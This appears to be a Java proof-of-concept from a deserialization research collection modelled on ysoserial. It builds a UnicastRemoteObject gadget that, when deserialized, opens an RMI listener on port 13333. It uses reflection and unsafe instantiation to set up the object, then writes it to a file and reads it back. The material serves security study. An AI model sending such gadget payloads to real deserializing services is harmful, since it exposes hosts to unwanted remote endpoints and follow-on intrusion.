package org.su18.serialize.ysoserial.RMI.UnicastRemoteObject;

import org.su18.serialize.utils.ClassUtil;
import org.su18.serialize.utils.SerializeUtil;
import sun.rmi.server.UnicastServerRef;

import java.lang.reflect.Field;
import java.rmi.server.RemoteObject;
import java.rmi.server.UnicastRemoteObject;

/**
 * @author su18
 */
public class UnicastRemoteObject1 {

	public static void main(String[] args) throws Exception {
		int port = 13333;

		// 使用
		Object uro   = ClassUtil.createInstanceUnsafely(UnicastRemoteObject.class);
		Field  field = UnicastRemoteObject.class.getDeclaredField("port");
		field.setAccessible(true);
		field.set(uro, port);

		// 写入父类 RemoteObject 的 ref 属性防止 writeObject 时报错
		Field field1 = RemoteObject.class.getDeclaredField("ref");
		field1.setAccessible(true);
		field1.set(uro, new UnicastServerRef(port));

		SerializeUtil.writeObjectToFile(uro);
		SerializeUtil.readFileObject();

		// 保持进程
		Thread.sleep(100000);
	}
}
